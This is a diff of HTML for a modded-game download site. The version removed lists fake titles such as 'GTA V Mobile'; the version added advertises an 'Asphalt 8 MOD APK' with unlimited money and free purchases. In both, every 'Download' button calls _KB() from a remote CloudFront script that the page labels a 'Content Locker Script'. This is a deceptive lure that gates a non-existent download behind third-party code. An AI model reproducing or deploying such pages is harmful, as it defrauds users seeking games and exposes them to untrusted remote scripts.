@@ -1,499 +1,424 @@
 <!DOCTYPE html>
+<!-- 
+    Author: yassinespino9
+-->
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Top Mobile Games Download | Free & Trending</title>
-<style>
-:root {
-    --main-bg: #f6f7fb;
-    --accent: #4fd1c5;
-    --accent2: #36a1ea;
-    --card-bg: #fff;
-    --text: #232b3a;
-    --subtext: #5b6b8c;
-    --radius: 20px;
-    --transition: 0.3s;
-    --shadow: 0 4px 16px rgba(80,120,200,0.09);
-}
-body.dark {
-    --main-bg: #181f29;
-    --accent: #4fd1c5;
-    --accent2: #36a1ea;
-    --card-bg: #232b3a;
-    --text: #fff;
-    --subtext: #b5e9e3;
-    --shadow: 0 4px 16px rgba(0,0,0,0.12);
-}
-body {
-    background: var(--main-bg);
-    color: var(--text);
-    font-family: 'Segoe UI', Arial, sans-serif;
-    margin: 0;
-    line-height: 1.5;
-    transition: background var(--transition), color var(--transition);
-}
-header {
-    background: linear-gradient(90deg, var(--accent) 0%, var(--accent2) 100%);
-    padding: 1.2rem 0;
-    text-align: center;
-    position: sticky;
-    top: 0;
-    z-index: 10;
-    box-shadow: var(--shadow);
-}
-.logo {
-    font-size: 2.2rem;
-    font-weight: bold;
-    color: #fff;
-    letter-spacing: 2px;
-    margin-bottom: 0.2rem;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 0.5rem;
-}
-.logo span {
-    background: #fff;
-    color: var(--accent);
-    padding: 0 0.4em;
-    border-radius: 8px;
-    font-size: 1.3rem;
-}
-nav {
-    margin-top: 0.5rem;
-    display: inline-block;
-}
-nav a {
-    color: #fff;
-    margin: 0 1rem;
-    text-decoration: none;
-    font-weight: 500;
-    opacity: 0.85;
-    transition: color var(--transition);
-}
-nav a:hover {
-    color: #232b3a;
-}
-.theme-toggle {
-    float: right;
-    margin-right: 1.2rem;
-    margin-top: -2.8rem;
-    background: var(--card-bg);
-    color: var(--text);
-    border: none;
-    border-radius: 50%;
-    width: 40px;
-    height: 40px;
-    cursor: pointer;
-    box-shadow: var(--shadow);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 1.3rem;
-    transition: background var(--transition), color var(--transition);
-}
-main {
-    max-width: 1100px;
-    margin: 2.5rem auto 0 auto;
-    padding: 0 1rem;
-}
-.intro {
-    text-align: center;
-    margin-bottom: 2rem;
-}
-.games-grid {
-    display: grid;
-    gap: 1.5rem;
-    grid-template-columns: repeat(2, 1fr);
-}
-@media (min-width: 800px) {
-    .games-grid {
-        grid-template-columns: repeat(4, 1fr);
-    }
-}
-.game-card {
-    background: var(--card-bg);
-    border-radius: var(--radius);
-    box-shadow: var(--shadow);
-    padding: 1rem 1rem 1.2rem 1rem;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    transition: transform var(--transition), box-shadow var(--transition);
-    opacity: 0.98;
-    min-height: 410px;
-}
-.game-card:hover {
-    transform: translateY(-8px) scale(1.04);
-    box-shadow: 0 8px 24px #4fd1c535;
-}
-.game-img {
-    width: 96px;
-    height: 96px;
-    object-fit: contain;
-    border-radius: 18px;
-    margin-bottom: 1rem;
-    box-shadow: 0 2px 12px #4fd1c520;
-    border: 3px solid var(--accent);
-    background: #fff;
-    transition: border-color var(--transition), background var(--transition);
-}
-body.dark .game-img {
-    background: #232b3a;
-}
-.game-card:hover .game-img {
-    border-color: var(--accent2);
-}
-.game-title {
-    font-size: 1.18rem;
-    font-weight: 700;
-    margin-bottom: 0.35rem;
-    text-align: center;
-}
-.game-meta {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 0.5em 0.7em;
-    justify-content: center;
-    margin-bottom: 0.7em;
-    font-size: 0.98em;
-    color: var(--subtext);
-}
-.game-meta span {
-    background: #eaf8fd;
-    color: #1e7ebc;
-    border-radius: 8px;
-    padding: 0.10em 0.6em;
-    font-weight: 500;
-    font-size: 0.97em;
-}
-body.dark .game-meta span {
-    background: #28495b;
-    color: #4fd1c5;
-}
-.game-desc {
-    font-size: 0.96rem;
-    color: var(--subtext);
-    text-align: left;
-    margin-bottom: 1.1rem;
-    min-height: 68px;
-    width: 100%;
-}
-.features-list {
-    text-align: left;
-    margin: 0.4em 0 0 0;
-    padding-left: 1em;
-    color: #222;
-    font-size: 0.97em;
-}
-body.dark .features-list {
-    color: #fff;
-}
-.features-list li {
-    margin-bottom: 0.18em;
-    list-style: none;
-}
-.features-list li:before {
-    content: "•";
-    color: var(--accent2);
-    margin-right: 0.5em;
-    font-weight: bold;
-}
-.download-btn {
-    background: linear-gradient(90deg, var(--accent), var(--accent2));
-    color: #fff;
-    border: none;
-    border-radius: 12px;
-    padding: 0.55em 1.7em;
-    font-size: 1rem;
-    font-weight: 600;
-    cursor: pointer;
-    transition: box-shadow var(--transition), background var(--transition), transform var(--transition);
-    box-shadow: 0 2px 10px #4fd1c530;
-    outline: none;
-    animation: pulse 1.8s infinite;
-    margin-top: auto;
-}
-.download-btn:hover {
-    background: #f7fafc;
-    color: var(--accent);
-    transform: scale(1.05);
-}
-@keyframes pulse {
-    0% { box-shadow: 0 0 0 0 #4fd1c530; }
-    70% { box-shadow: 0 0 12px 18px #4fd1c520; }
-    100% { box-shadow: 0 0 0 0 #4fd1c530; }
-}
-footer {
-    background: var(--card-bg);
-    margin-top: 3rem;
-    padding: 2rem 0 1rem 0;
-    text-align: center;
-    border-radius: 24px 24px 0 0;
-    color: var(--subtext);
-    font-size: 1.1rem;
-    box-shadow: 0 -4px 24px #4fd1c515;
-}
-.footer-links {
-    margin-bottom: 1rem;
-}
-.footer-links a {
-    color: var(--accent2);
-    margin: 0 0.7rem;
-    text-decoration: none;
-    font-weight: 500;
-    opacity: 0.9;
-    transition: color var(--transition);
-}
-.footer-links a:hover {
-    color: var(--accent);
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Asphalt 8 MOD APK - GamesAPK.online</title>
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- SEO Meta Tags -->
+    <meta name="description" content="Download Asphalt 8 MOD APK - Unlimited Money, Ad-Free Gameplay, and All Items Unlocked. Experience the best racing game with enhanced features!">
+    <meta name="keywords" content="asphalt 8 mod apk, racing games, android games, mobile games, car racing game">
+    <meta name="author" content="GamesAPK.online">
+    
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="Asphalt 8 MOD APK - Free Download">
+    <meta property="og:description" content="Download Asphalt 8 MOD APK with unlimited money and all features unlocked!">
+    <meta property="og:image" content="https://i.imgur.com/WvbMbXs.png">
+    <meta property="og:url" content="https://gamesapk.online">
+    
+    <style>
+        :root {
+            --primary-color: #1a237e;
+            --secondary-color: #303f9f;
+            --accent-color: #ff3d00;
+            --text-color: #263238;
+            --light-bg: #f5f6fa;
+            --gradient: linear-gradient(135deg, #1a237e 0%, #303f9f 100%);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: var(--light-bg);
+            line-height: 1.6;
+        }
+
+        /* Header Styles */
+        header {
+            background: var(--gradient);
+            padding: 0.5rem;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+            min-height: 50px;
+            display: flex;
+            align-items: center;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+        }
+
+        .header-content .logo {
+            width: 100px;
+            height: auto;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+        }
+
+        /* Hero Section */
+        .hero {
+            margin-top: 90px;
+            position: relative;
+            height: 300px;
+            overflow: hidden;
+        }
+
+        .banner-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            animation: zoomBanner 20s infinite alternate;
+        }
+
+        @keyframes zoomBanner {
+            from { transform: scale(1); }
+            to { transform: scale(1.1); }
+        }
+
+        .hero-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(0deg, rgba(26,35,126,0.8) 0%, rgba(26,35,126,0.4) 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            color: white;
+            padding: 0 1rem;
+        }
+
+        .hero-content {
+            max-width: 800px;
+        }
+
+        .hero-content h1 {
+            font-size: 2rem;
+            margin-bottom: 0.8rem;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+
+        /* Game Container Styles */
+        .game-container {
+            max-width: 1200px;
+            margin: -50px auto 2rem;
+            padding: 0 1rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .game-card {
+            background: white;
+            border-radius: 20px;
+            padding: 2rem;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            animation: slideUp 0.8s ease-out;
+        }
+
+        .game-header {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .game-icon {
+            width: 120px;
+            height: 120px;
+            border-radius: 24px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .game-title {
+            color: var(--primary-color);
+            font-size: 1.8rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .version-info {
+            color: #666;
+            margin-bottom: 1rem;
+        }
+
+        .game-description {
+            color: var(--accent-color);
+            font-weight: 500;
+            font-size: 1.1rem;
+        }
+
+        .game-highlights {
+            margin: 2rem 0;
+            padding: 1.5rem;
+            background: var(--light-bg);
+            border-radius: 15px;
+        }
+
+        .highlight-text {
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+        }
+
+        .highlights-list {
+            list-style: none;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+        }
+
+        .highlights-list li {
+            padding: 0.5rem 0;
+        }
+
+        .game-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+
+        .info-item {
+            background: var(--light-bg);
+            padding: 1.2rem;
+            border-radius: 15px;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: transform 0.3s;
+        }
+
+        .info-item:hover {
+            transform: translateY(-5px);
+        }
+
+        .features {
+            margin: 2rem 0;
+        }
+
+        .features h2 {
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+        }
+
+        .feature-item {
+            background: var(--light-bg);
+            padding: 1.2rem;
+            border-radius: 15px;
+            animation: fadeIn 0.5s ease-in;
+            transition: all 0.3s;
+        }
+
+        .feature-item:hover {
+            background: var(--primary-color);
+            color: white;
+            transform: translateY(-5px);
+        }
+
+        .download-btn {
+            background: var(--accent-color);
+            color: white;
+            padding: 1.2rem 3rem;
+            border: none;
+            border-radius: 30px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: block;
+            width: fit-content;
+            margin: 2rem auto;
+            text-decoration: none;
+            box-shadow: 0 5px 15px rgba(255,61,0,0.3);
+        }
+
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255,61,0,0.4);
+        }
+
+        /* Footer Styles */
+        footer {
+            background: var(--gradient);
+            color: white;
+            padding: 2rem;
+            text-align: center;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        /* Animations */
+        @keyframes slideUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Mobile Responsiveness */
+        @media (max-width: 768px) {
+            .header-content .logo {
+                width: 80px;
+            }
+            
+            .hero {
+                margin-top: 80px;
+                height: 200px;
+            }
+
+            .hero-content h1 {
+                font-size: 1.5rem;
+            }
+
+            .game-header {
+                flex-direction: column;
+                text-align: center;
+                gap: 1rem;
+            }
+
+            .game-info {
+                grid-template-columns: 1fr;
+            }
+
+            .download-btn {
+                width: 100%;
+            }
+        }
+    </style>
 </head>
-
-<script type="text/javascript">
-    var FELPY_KUn_JvSJmc={"it":4496832,"key":"37373"};
-</script>
-<script src="https://d2yc6hxtq0phup.cloudfront.net/284984f.js"></script>
-
 <body>
     <header>
-        <button class="theme-toggle" id="themeToggle" title="Toggle theme">
-            <span id="themeIcon">🌙</span>
-        </button>
-        <div class="logo">
-            <img src="https://img.icons8.com/fluency/48/000000/controller.png" alt="Logo" style="width:32px;height:32px;">
-            Game<span>Zone</span>
+        <div class="header-content">
+            <img src="https://i.imgur.com/Z4MM7pQ.png" alt="GamesAPK.online Logo" class="logo">
         </div>
-        <nav>
-            <a href="#games">Games</a>
-            <a href="#about">About</a>
-            <a href="#contact">Contact</a>
-        </nav>
     </header>
-    <main>
-        <section class="intro">
-            <h1>Best Mobile Games <span style="color:var(--accent)">Download Hub</span></h1>
-            <p>Discover, play, and download the most wanted mobile games for Android & iOS. Safe, fast, and always up-to-date.</p>
-        </section>
-        <section id="games" class="games-grid">
 
-            <!-- GTA V Mobile -->
-            <div class="game-card">
-                <img src="https://i.imgur.com/tdugRQE.png" alt="GTA V Mobile" class="game-img" loading="lazy">
-                <div class="game-title">GTA V Mobile</div>
-                <div class="game-meta">
-                    <span>⭐ 4.9</span>
-                    <span>(19k reviews)</span>
-                    <span>Action</span>
-                    <span>2.3 GB</span>
-                </div>
-                <div class="game-desc">
-                    Explore Los Santos, complete missions and enjoy open-world freedom.
-                    <ul class="features-list">
-                        <li>All vehicles unlocked</li>
-                        <li>Unlimited money</li>
-                        <li>HD graphics</li>
-                    </ul>
-                </div>
-                <button class="download-btn" onclick="_KB()">Download</button>
+    <section class="hero">
+        <img src="https://i.imgur.com/6IrICi5.jpeg" alt="Asphalt 8 Banner" class="banner-img">
+        <div class="hero-overlay">
+            <div class="hero-content">
+                <h1>Asphalt 8 MOD APK - Fully Unlocked Version!</h1>
+                <p>🏎️ Experience the Ultimate Racing Game with All Features Unlocked!</p>
             </div>
-
-            <!-- Red Dead 2 Mobile -->
-            <div class="game-card">
-                <img src="https://i.imgur.com/Hd6NonO.png" alt="Red Dead 2 Mobile" class="game-img" loading="lazy">
-                <div class="game-title">Red Dead 2 Mobile</div>
-                <div class="game-meta">
-                    <span>⭐ 4.8</span>
-                    <span>(12.3k reviews)</span>
-                    <span>Adventure</span>
-                    <span>1.8 GB</span>
-                </div>
-                <div class="game-desc">
-                    Ride across the wild west in a deep story and open world.
-                    <ul class="features-list">
-                        <li>Full story mode</li>
-                        <li>Huge open map</li>
-                        <li>All horses & gear</li>
-                    </ul>
-                </div>
-                <button class="download-btn" onclick="_KB()">Download</button>
-            </div>
-
-            <!-- Roblox MOD -->
-            <div class="game-card">
-                <img src="https://i.imgur.com/kBCDaDb.png" alt="Roblox MOD" class="game-img" loading="lazy">
-                <div class="game-title">Roblox MOD</div>
-                <div class="game-meta">
-                    <span>⭐ 4.7</span>
-                    <span>(17.8k reviews)</span>
-                    <span>Adventure</span>
-                    <span>150 MB</span>
-                </div>
-                <div class="game-desc">
-                    Play and create in endless worlds with unlimited resources.
-                    <ul class="features-list">
-                        <li>Unlimited resources</li>
-                        <li>All skins unlocked</li>
-                        <li>No ads</li>
-                    </ul>
-                </div>
-                <button class="download-btn" onclick="_KB()">Download</button>
-            </div>
-
-            <!-- Minecraft MOD -->
-            <div class="game-card">
-                <img src="https://i.imgur.com/0dsrdep.png" alt="Minecraft MOD" class="game-img" loading="lazy">
-                <div class="game-title">Minecraft MOD</div>
-                <div class="game-meta">
-                    <span>⭐ 4.8</span>
-                    <span>(22k reviews)</span>
-                    <span>Sandbox</span>
-                    <span>250 MB</span>
-                </div>
-                <div class="game-desc">
-                    Build, survive and craft anything you imagine.
-                    <ul class="features-list">
-                        <li>All skins unlocked</li>
-                        <li>Infinite resources</li>
-                        <li>All game modes</li>
-                    </ul>
-                </div>
-                <button class="download-btn" onclick="_KB()">Download</button>
-            </div>
-
-            <!-- Free Fire -->
-            <div class="game-card">
-                <img src="https://i.imgur.com/GEvzeyD.png" alt="Free Fire" class="game-img" loading="lazy">
-                <div class="game-title">Free Fire</div>
-                <div class="game-meta">
-                    <span>⭐ 4.6</span>
-                    <span>(30k reviews)</span>
-                    <span>Battle Royale</span>
-                    <span>800 MB</span>
-                </div>
-                <div class="game-desc">
-                    Jump, loot, and survive till the end in fast 10-minute matches.
-                    <ul class="features-list">
-                        <li>All characters unlocked</li>
-                        <li>Unlimited diamonds</li>
-                        <li>No ads</li>
-                    </ul>
-                </div>
-                <button class="download-btn" onclick="_KB()">Download</button>
-            </div>
-
-            <!-- Fortnite Mobile -->
-            <div class="game-card">
-                <img src="https://i.imgur.com/1nNEmAd.png" alt="Fortnite Mobile" class="game-img" loading="lazy">
-                <div class="game-title">Fortnite Mobile</div>
-                <div class="game-meta">
-                    <span>⭐ 4.8</span>
-                    <span>(15k reviews)</span>
-                    <span>Battle Royale</span>
-                    <span>3.5 GB</span>
-                </div>
-                <div class="game-desc">
-                    Build, fight, and win in the legendary battle royale.
-                    <ul class="features-list">
-                        <li>All skins unlocked</li>
-                        <li>Fast performance</li>
-                        <li>Exclusive events</li>
-                    </ul>
-                </div>
-                <button class="download-btn" onclick="_KB()">Download</button>
-            </div>
-
-            <!-- Brawl Stars MOD -->
-            <div class="game-card">
-                <img src="https://i.imgur.com/kWcBXuh.png" alt="Brawl Stars MOD" class="game-img" loading="lazy">
-                <div class="game-title">Brawl Stars MOD</div>
-                <div class="game-meta">
-                    <span>⭐ 4.7</span>
-                    <span>(11.2k reviews)</span>
-                    <span>Action</span>
-                    <span>180 MB</span>
-                </div>
-                <div class="game-desc">
-                    Unlock all brawlers and skins for nonstop multiplayer action.
-                    <ul class="features-list">
-                        <li>All brawlers</li>
-                        <li>Unlimited coins</li>
-                        <li>No ads</li>
-                    </ul>
-                </div>
-                <button class="download-btn" onclick="_KB()">Download</button>
-            </div>
-
-            <!-- Stumble Guys MOD -->
-            <div class="game-card">
-                <img src="https://i.imgur.com/bsYw3pe.png" alt="Stumble Guys MOD" class="game-img" loading="lazy">
-                <div class="game-title">Stumble Guys MOD</div>
-                <div class="game-meta">
-                    <span>⭐ 4.5</span>
-                    <span>(9.8k reviews)</span>
-                    <span>Arcade</span>
-                    <span>90 MB</span>
-                </div>
-                <div class="game-desc">
-                    Race, stumble, and win with all skins and emotes unlocked.
-                    <ul class="features-list">
-                        <li>All skins</li>
-                        <li>All emotes</li>
-                        <li>Unlimited gems</li>
-                    </ul>
-                </div>
-                <button class="download-btn" onclick="_KB()">Download</button>
-            </div>
-
-        </section>
-        <section id="about" class="intro" style="margin-top:2.5rem;">
-            <h2>About GameZone</h2>
-            <p>GameZone is your trusted place to discover and download the best mobile games, including modded and premium versions. We handpick popular and safe games for Android and iOS!</p>
-        </section>
-        <section id="contact" class="intro" style="margin-top:2rem;">
-            <h2>Contact & Support</h2>
-            <p>Need help or want to suggest a game? <br>Email us: <a href="mailto:support@gamezone.com" style="color:var(--accent);text-decoration:underline;">support@gamezone.com</a></p>
-        </section>
-    </main>
-    <footer>
-        <div class="footer-links">
-            <a href="#games">Games</a>
-            <a href="#about">About</a>
-            <a href="#contact">Contact</a>
         </div>
-        <div>
-            &copy; 2025 GameZone. All Rights Reserved.
+    </section>
+
+    <main class="game-container">
+        <div class="game-card">
+            <div class="game-header">
+                <img src="https://i.imgur.com/WvbMbXs.png" alt="Asphalt 8 Icon" class="game-icon">
+                <div>
+                    <h1 class="game-title">Asphalt 8 - The Best Racing Game Ever!</h1>
+                    <p class="version-info">Version 8.3.0</p>
+                    <p class="game-description">
+                        🌟 Premium Version Available for Free with All Features Unlocked!
+                    </p>
+                </div>
+            </div>
+            
+            <div class="game-highlights">
+                <p class="highlight-text">⚡ Why Choose Our MOD Version?</p>
+                <ul class="highlights-list">
+                    <li>✨ Unlimited Money for Upgrades</li>
+                    <li>🏎️ All Cars Unlocked</li>
+                    <li>🎮 Ad-Free Gaming Experience</li>
+                    <li>🔧 Regular Updates & Support</li>
+                </ul>
+            </div>
+
+            <div class="game-info">
+                <div class="info-item">⭐ Rating: 5.0</div>
+                <div class="info-item">📱 Size: 2541.33 MB</div>
+                <div class="info-item">🔧 Requires Android 7.0+</div>
+                <div class="info-item">🎮 Category: Racing</div>
+            </div>
+
+            <div class="features">
+                <h2>✨ Premium MOD Features</h2>
+                <div class="feature-grid">
+                    <div class="feature-item">✅ Free In-Game Purchases</div>
+                    <div class="feature-item">✅ No Advertisements</div>
+                    <div class="feature-item">✅ Unlimited Money</div>
+                    <div class="feature-item">✅ All Cars Unlocked</div>
+                    <div class="feature-item">✅ Premium Features</div>
+                    <div class="feature-item">✅ MOD Menu Included</div>
+                </div>
+            </div>
+
+            <button class="download-btn" onclick="_KB()">DOWNLOAD MOD APK</button>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <p>&copy; GamesAPK.online - Your Ultimate Source for Modified Android Games</p>
         </div>
     </footer>
+
+    <!-- Content Locker Script -->
+    <script type="text/javascript">
+    var YjPYk_UHG_aeTkvc={"it":4498979,"key":"6f8be"};
+    </script>
+    <script src="https://d2yc6hxtq0phup.cloudfront.net/89d4961.js"></script>
+
+    <!-- Animation Script -->
     <script>
-        // Theme handling
-        const themeToggle = document.getElementById('themeToggle');
-        const themeIcon = document.getElementById('themeIcon');
-        function setTheme(mode) {
-            if (mode === 'dark') {
-                document.body.classList.add('dark');
-                themeIcon.textContent = '☀️';
-            } else {
-                document.body.classList.remove('dark');
-                themeIcon.textContent = '🌙';
+        document.addEventListener('DOMContentLoaded', function() {
+            const elements = document.querySelectorAll('.feature-item');
+            
+            function checkVisibility() {
+                elements.forEach(element => {
+                    const rect = element.getBoundingClientRect();
+                    const isVisible = rect.top <= window.innerHeight && rect.bottom >= 0;
+                    
+                    if (isVisible) {
+                        element.style.opacity = '1';
+                    }
+                });
             }
-            localStorage.setItem('theme', mode);
-        }
-        (function() {
-            let theme = localStorage.getItem('theme');
-            if (!theme) theme = 'light';
-            setTheme(theme);
-        })();
-        themeToggle.onclick = function() {
-            let isDark = document.body.classList.contains('dark');
-            setTheme(isDark ? 'light' : 'dark');
-        };
-        // تعريف الدالة _KB() إذا لم تكن موجودة (للاختبار)
-        if(typeof _KB !== "function"){
-            window._KB = function(){ alert('Download script will run here!'); }
-        }
+
+            window.addEventListener('scroll', checkVisibility);
+            checkVisibility();
+        });
     </script>
 </body>
 </html>
